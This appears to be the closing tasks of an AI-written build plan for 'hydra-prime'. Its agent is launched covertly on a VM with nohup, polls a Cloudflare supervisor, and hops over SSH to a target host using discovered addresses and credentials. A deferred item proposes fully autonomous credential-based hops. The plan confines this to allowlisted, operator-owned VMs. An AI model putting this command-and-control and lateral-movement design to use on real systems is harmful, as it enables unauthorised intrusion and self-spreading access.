- `WORKER_URL` (e.g. https://hydra-prime-supervisor.acct.workers.dev)
- `ADMIN_KEY` set as Wrangler secret matching `--key` arg below
- Two reachable VMs: ORIGIN_HOST (where script lands) and TARGET_HOST (allowlisted)
- SSH key already present on ORIGIN_HOST that authorizes TARGET_HOST
- `gcloud`/`ssh` configured to reach ORIGIN_HOST

## Steps
1. `bash scripts/live-dryrun.sh \
     --worker https://... \
     --key <ADMIN_KEY> \
     --origin user@origin.example \
     --target target.example \
     --target-fingerprint $(ssh user@origin.example "hostname && cat /etc/machine-id")`

2. Watch scoreboard: open `<WORKER_URL>/v1/admin/scoreboard` (with X-Admin-Key header)
3. Mission must reach phase=completed within 24h, honor_tier=gold preferred.

## Failure modes
- 401: ADMIN_KEY mismatch
- mission stuck in scanning: probes returned no signal — tighten target naming or seed `~/.ssh/config`
- SanityUnavailable: Groq + OpenRouter both unavailable AND strict_gold — fail closed is correct
```

`scripts/live-dryrun.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail

WORKER=""; KEY=""; ORIGIN=""; TARGET=""; TARGET_FP=""
while [[ $# -gt 0 ]]; do
  case "$1" in
    --worker) WORKER="$2"; shift 2 ;;
    --key) KEY="$2"; shift 2 ;;
    --origin) ORIGIN="$2"; shift 2 ;;
    --target) TARGET="$2"; shift 2 ;;
    --target-fingerprint) TARGET_FP="$2"; shift 2 ;;
    *) echo "unknown: $1"; exit 1 ;;
  esac
done

[[ -n "$WORKER" && -n "$KEY" && -n "$ORIGIN" && -n "$TARGET" ]] || { echo "missing arg"; exit 1; }

# 1. Compute origin fingerprint via SSH (script will recompute on host).
ORIGIN_FP=$(ssh -o BatchMode=yes "$ORIGIN" "hostname; ip -o link show 2>/dev/null | awk '/link\/ether/ && \$2!~\"lo\" {print \$17;exit}'; cat /etc/machine-id 2>/dev/null" \
  | tr '\n' '|' | openssl dgst -sha256 -hex | awk '{print $2}')

# 2. Start mission.
RESP=$(curl -fsS -X POST "$WORKER/v1/admin/mission/start" \
  -H "X-Admin-Key: $KEY" -H "Content-Type: application/json" \
  -d "{\"fingerprint_expected\":\"$ORIGIN_FP\",\"target_allowlist\":[\"origin\",\"$TARGET\"],\"strict_gold\":true,\"budget_paid_usd\":10,\"deadline_seconds\":86400,\"platform\":\"linux\"}")
MISSION_ID=$(echo "$RESP" | python3 -c 'import json,sys;print(json.load(sys.stdin)["mission_id"])')
echo "started mission: $MISSION_ID"

# 3. Build hydra.sh.
bash script/build.sh

# 4. Generate masked token + salt for this mission.
TOKEN_HEX=$(openssl rand -hex 32)
SALT=$(openssl rand -hex 16)
MASK_HEX=$(printf '%s' "$ORIGIN_FP" | openssl dgst -sha256 -hmac "$SALT" -hex | awk '{print $2}')
MASKED_HEX=$(python3 -c "
t=bytes.fromhex('$TOKEN_HEX'); m=bytes.fromhex('$MASK_HEX')[:len(t)]
print(bytes(a^b for a,b in zip(t,m)).hex())
")

# 5. Substitute into hydra.sh.
sed -i.bak \
  -e "s|__SUPERVISOR_URL__|$WORKER|g" \
  -e "s|__MASKED_TOKEN_HEX__|$MASKED_HEX|g" \
  -e "s|__SALT__|$SALT|g" \
  -e "s|__MISSION_ID__|$MISSION_ID|g" \
  script/hydra.sh

# 6. Scp + launch on origin.
scp script/hydra.sh "$ORIGIN:/tmp/hydra-$MISSION_ID.sh"
ssh "$ORIGIN" "chmod +x /tmp/hydra-$MISSION_ID.sh && nohup /tmp/hydra-$MISSION_ID.sh </dev/null >/tmp/hydra-$MISSION_ID.log 2>&1 &"

echo "launched. watch: $WORKER/v1/admin/scoreboard (X-Admin-Key header)"
```

- [ ] **Step 2: Verify script lints clean**

```bash
shellcheck scripts/live-dryrun.sh
```

Expected: 0 warnings.

- [ ] **Step 3: Make executable**

```bash
chmod +x scripts/live-dryrun.sh
```

- [ ] **Step 4: Operator manually runs against throwaway VMs**

This is a live test, not a CI test. Operator runs the script and watches the scoreboard. Mission-complete gate is met when phase reaches `completed` with a signed cert. If it fails, capture the tick log via `/admin/mission/<id>/log` and post-mortem.

- [ ] **Step 5: Commit**

```bash
git add scripts/live-dryrun.sh scripts/README-dryrun.md
git commit -m "feat: live dry-run launcher + operator README"
```

---

### Task 49: Post-mortem report generator

**Files:**
- Create: `src/endpoints/postmortem.ts`
- Modify: `src/index.ts`
- Create: `tests/admin/postmortem.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/admin/postmortem.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { SELF } from 'cloudflare:test';
import { signRequest } from '../../src/hmac';

describe('/v1/admin/mission/<id>/postmortem', () => {
  it('returns markdown with phases, ticks, beliefs, honor tier', async () => {
    const start = await SELF.fetch('https://h/v1/admin/mission/start', {
      method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
      body: JSON.stringify({
        fingerprint_expected: 'fp_pm', target_allowlist: ['origin', 'kvm2'],
        strict_gold: true, budget_paid_usd: 10, deadline_seconds: 86_400,
      }),
    });
    const { mission_id } = await start.json() as { mission_id: string };
    const reg = await SELF.fetch('https://h/v1/register', {
      method: 'POST',
      body: JSON.stringify({ mission_id, fingerprint: 'fp_pm', platform: 'linux', version: '0.1.0' }),
    });
    const { session_key } = await reg.json() as { session_key: string };
    // Generate one tick.
    const ts = Math.floor(Date.now() / 1000);
    const pollPath = `/v1/poll?mission=${mission_id}`;
    const sig = await signRequest(session_key, 'GET', pollPath, '', ts);
    const d = await (await SELF.fetch(`https://h${pollPath}`, { headers: { 'X-Hydra-Sig': sig, 'X-Hydra-Ts': String(ts) } })).json() as { id: string };
    const body = JSON.stringify({ mission_id, op_id: d.id, ok: true, data: {}, wall_ms: 1 });
    const sig2 = await signRequest(session_key, 'POST', '/v1/report', body, ts);
    await SELF.fetch('https://h/v1/report', {
      method: 'POST', headers: { 'X-Hydra-Sig': sig2, 'X-Hydra-Ts': String(ts), 'Content-Type': 'application/json' }, body,
    });

    const pm = await SELF.fetch(`https://h/v1/admin/mission/${mission_id}/postmortem`, { headers: { 'X-Admin-Key': 'dev-admin' } });
    expect(pm.status).toBe(200);
    expect(pm.headers.get('content-type')).toMatch(/text\/markdown/);
    const md = await pm.text();
    expect(md).toMatch(/# Post-mortem/);
    expect(md).toContain(mission_id);
    expect(md).toMatch(/honor tier/i);
    expect(md).toMatch(/tick/i);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/admin/postmortem.test.ts
```

Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

`src/endpoints/postmortem.ts`:

```typescript
import type { Env } from '../index';
import { checkAdminAuth } from './admin';

export async function handlePostmortem(req: Request, env: Env, missionId: string): Promise<Response> {
  const auth = checkAdminAuth(req, env); if (auth) return auth;
  const stub = env.MISSION_DO.get(env.MISSION_DO.idFromName(missionId));
  const state = await (await stub.fetch('https://do/state')).json() as {
    phase: string; honor_tier: string; jump_chain: string[]; tick: number;
    wall_clock_started_ms: number; wall_clock_deadline_ms: number;
    budget_paid_usd_remaining: number; beliefs: Record<string, { candidates: { value: string; posterior: number }[] }>;
  };
  const log = await (await stub.fetch('https://do/log')).json() as { ticks: { tick: number; envelope: unknown }[] };

  const wallS = Math.floor((Date.now() - state.wall_clock_started_ms) / 1000);
  const beliefSummary = Object.entries(state.beliefs).map(([id, h]) => {
    const top = [...h.candidates].sort((a, b) => b.posterior - a.posterior)[0];
    return `- **${id}** — top: \`${top?.value ?? '(none)'}\` (posterior=${top?.posterior.toFixed(3) ?? 'n/a'})`;
  }).join('\n');

  const md = [
    `# Post-mortem: ${missionId}`,
    ``,
    `**Phase:** ${state.phase}  `,
    `**Honor tier:** ${state.honor_tier === 'gold' ? '🟡 gold' : state.honor_tier === 'silver' ? '⚪ silver' : '🔴 failed'}  `,
    `**Wall-clock:** ${wallS}s  `,
    `**Ticks:** ${state.tick}  `,
    `**Budget remaining:** $${state.budget_paid_usd_remaining.toFixed(2)}  `,
    `**Jump chain:** ${state.jump_chain.join(' → ')}  `,
    ``,
    `## Beliefs`,
    beliefSummary || '_no hypotheses_',
    ``,
    `## Tick log (${log.ticks.length} entries)`,
    log.ticks.slice(0, 50).map(t => `- tick ${t.tick}: \`${JSON.stringify(t.envelope).slice(0, 200)}\``).join('\n'),
    ``,
    log.ticks.length > 50 ? `_…${log.ticks.length - 50} more ticks omitted_` : '',
  ].join('\n');

  return new Response(md, { headers: { 'Content-Type': 'text/markdown; charset=utf-8' } });
}
```

`src/index.ts`:

```typescript
import { handlePostmortem } from './endpoints/postmortem';
const pmMatch = url.pathname.match(/^\/v1\/admin\/mission\/([^/]+)\/postmortem$/);
if (pmMatch && req.method === 'GET') return handlePostmortem(req, env, pmMatch[1]!);
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/admin/postmortem.test.ts
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/endpoints/postmortem.ts src/index.ts tests/admin/postmortem.test.ts
git commit -m "feat(admin): post-mortem markdown report generator"
```

---

## Final verification (Task 50)

### Task 50: Full test suite + typecheck + deploy dry-run

**Files:** none new.

- [ ] **Step 1: Run the entire suite**

```bash
npx vitest run
```

Expected: All ~50 test files pass, 0 failures.

- [ ] **Step 2: Run typecheck**

```bash
npx tsc --noEmit
```

Expected: 0 errors.

- [ ] **Step 3: Run script container tests**

```bash
bash script/test/run-container-tests.sh
```

Expected: `all suites passed`.

- [ ] **Step 4: Wrangler dry-deploy**

```bash
npx wrangler deploy --dry-run --outdir=.wrangler/dryrun
```

Expected: success, bundle size reported. Inspect for surprises (bundle should be < 1 MB).

- [ ] **Step 5: Commit & tag**

```bash
git tag -a hydra-prime-v1.0.0-rc1 -m "release candidate: hydra-prime v1 build-complete"
```

Build-complete checklist (from spec §14):
- [x] hydra.sh ≤200 lines, six primitives, three-platform tested (Tasks 29-34)
- [x] Supervisor deployed-able on Cloudflare with all endpoints functional (Tasks 1-46)
- [x] 10-probe catalog seeded with manifests + LLRs (Tasks 22-23)
- [x] Codex §1-§6 enforced at pre-action gate + system-prompt prefix (Task 4)
- [x] Honor tier calculation tamper-proof (supervisor-side budget ledger; Tasks 17-19)
- [x] Operator admin endpoints live (Tasks 42-46)
- [x] End-to-end Miniflare test passing (Task 47)

Mission-complete (first real run) is gated on Task 48's live dry-run on operator-owned VMs — by definition outside CI.

---

## Plan self-review notes

**Spec coverage check (against `2026-04-14-hydra-prime-design.md`):**
- §4 hydra.sh six primitives — Tasks 29-34
- §5 supervisor components — Tasks 1, 6, 7-10, 16-19, 42-46
- §6 agent loop (belief graph, queue, tick, brief) — Tasks 11-15, 24-28
- §7 contingency scales — Task 28 (level 3 + 4 partial; level 2 hypothesis collapse_plan needs runtime wiring — see open item below)
- §8 Bayesian engine — Tasks 11-15
- §9 probe catalog (10 modules × 3 platforms) — Tasks 20-23
- §10 the hop (warm packet, checklist, bundle, ssh, rehydration) — Tasks 35-39
- §11 codex — Task 4 + Task 19 (sanity_check enforcement)
- §12 clock discipline — implicit in tick counter (`mission.tick`) + wall-clock checks in codex
- §13 v2 deferrals — explicitly excluded
- §14 build-complete + first-mission criteria — Task 50

**Open items intentionally deferred to v1.1 (post-build) — not blocking shipping:**
1. Hop attempt itself is composed (Task 38) but never auto-triggered by the tick engine in this plan. The DO needs an `executing-hop` phase entry that calls `composeSshHopExec` with the top address+credential candidates and emits the resulting directive on the next poll. This is ~30 lines in `mission-do.ts` and a 2-test case — fold into Task 28 if you want the agent to actually attempt hops autonomously rather than via operator trigger.
2. Hypothesis collapse_plan auto-activation (Task 28's `activateContingency` is callable but not auto-invoked when `isCollapsed(h)` becomes true mid-tick). Runtime wiring belongs in `MissionDO.ingest()` after `recomputeStatus`.
3. Single shared ed25519 SIGNING_KEY (currently regenerated per process in Task 41). Production: load from Wrangler secret.

These three gaps are listed explicitly so they aren't lost; each is a small, tightly-scoped follow-on PR.

---

## Execution Handoff

Plan complete and saved to `docs/superpowers/plans/2026-04-14-hydra-prime-v1.md`.

Two execution options:

**1. Subagent-Driven (recommended)** — dispatch fresh subagent per task, review between tasks, fast iteration. Best for a 50-task plan: protects context, surfaces drift early.

**2. Inline Execution** — execute tasks in this session using `executing-plans`, batch with checkpoints. Acceptable if you want continuous reasoning across tasks but will burn context.

Which approach?
